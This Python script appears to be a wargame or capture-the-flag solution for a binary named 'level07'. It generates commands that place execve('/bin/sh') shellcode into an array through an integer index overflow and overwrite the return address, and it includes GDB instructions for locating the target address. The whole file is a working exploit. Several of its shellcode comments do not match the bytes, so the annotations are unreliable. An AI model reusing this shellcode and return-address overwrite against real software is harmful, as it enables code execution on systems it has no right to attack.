#!/usr/bin/env python3
"""
Level 7 Complete Working Exploit

This creates the full exploit payload to pipe into level07
"""

import sys
import struct

# Shellcode: execve("/bin/sh", NULL, NULL) with NOP sled
# Total: 21 bytes shellcode + padding
# https://shell-storm.org/shellcode/files/shellcode-752.html
shellcode_bytes = (
    b"\x90\x90\x90\x90"  # NOP sled
    b"\x90\x90\x90\x90"  # NOP sled
    b"\x90\x90\x90\x90"  # NOP sled
    b"\x90\x90\x90\x90"  # NOP sled
    b"\x6a\x0b\x58\x99"  # push 0xb; pop eax; cdq
    b"\x52\x68\x2f\x2f"  # push edx; push 0x68732f2f
    b"\x73\x68\x68\x2f"  # push 0x68732f2f
    b"\x62\x69\x6e\x89"  # push 0x68732f2f; mov ebx, esp
    b"\xe3\xb0\x0b\xcd"  # mov ebx, esp; xor ecx, ecx
    b"\x80"              # int 0x80
)

# Split shellcode into 4-byte chunks (little-endian integers)
def shellcode_to_ints(shellcode):
    ints = []
    for i in range(0, len(shellcode), 4):
        chunk = shellcode[i:i+4]
        if len(chunk) < 4:
            chunk = chunk + b"\x90" * (4 - len(chunk))  # Pad with NOPs
        # Convert to little-endian integer
        val = struct.unpack('<I', chunk)[0]
        ints.append(val)
    return ints

# Calculate overflow index for indices divisible by 3
def get_index(i):
    if i % 3 == 0:
        return 1073741824 + i  # Overflow
    return i

# Get shellcode address - this needs to be adjusted!
# Run in GDB: break *0x08048795, then print/x $ebx
# Add offset for NOP sled (e.g., +16 or +32)
def generate_exploit(database_addr):
    commands = []

    # Convert shellcode to integers
    shellcode_ints = shellcode_to_ints(shellcode_bytes)

    print(f"[*] Storing {len(shellcode_ints)} shellcode chunks...", file=sys.stderr)

    # Store shellcode starting at index 0
    for i, value in enumerate(shellcode_ints):
        index = get_index(i)
        commands.append("store")
        commands.append(str(value))
        commands.append(str(index))
        print(f"[*] Index {i} (overflow: {index}): 0x{value:08x}", file=sys.stderr)

    # Overwrite RET (index 114) with shellcode address
    ret_index = get_index(114)
    shellcode_addr = database_addr + 16  # Point into NOP sled

    print(f"[*] Database at: 0x{database_addr:08x}", file=sys.stderr)
    print(f"[*] Shellcode at: 0x{shellcode_addr:08x}", file=sys.stderr)
    print(f"[*] Writing to RET (index 114, overflow: {ret_index})", file=sys.stderr)

    commands.append("store")
    commands.append(str(shellcode_addr))
    commands.append(str(ret_index))

    # Quit to trigger RET
    commands.append("quit")

    return commands

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit_complete.py <database_address>", file=sys.stderr)
        print("", file=sys.stderr)
        print("To find database address:", file=sys.stderr)
        print("  gdb ./level07", file=sys.stderr)
        print("  (gdb) break *0x08048795", file=sys.stderr)
        print("  (gdb) run", file=sys.stderr)
        print("  (gdb) print/x $ebx", file=sys.stderr)
        print("", file=sys.stderr)
        print("Then add ~100 bytes for environment differences:", file=sys.stderr)
        print("  python3 exploit_complete.py 0xffffd6c4", file=sys.stderr)
        sys.exit(1)

    # Parse address
    addr_str = sys.argv[1]
    if addr_str.startswith("0x"):
        database_addr = int(addr_str, 16)
    else:
        database_addr = int(addr_str)

    commands = generate_exploit(database_addr)

    # Output commands
    for cmd in commands:
        print(cmd)
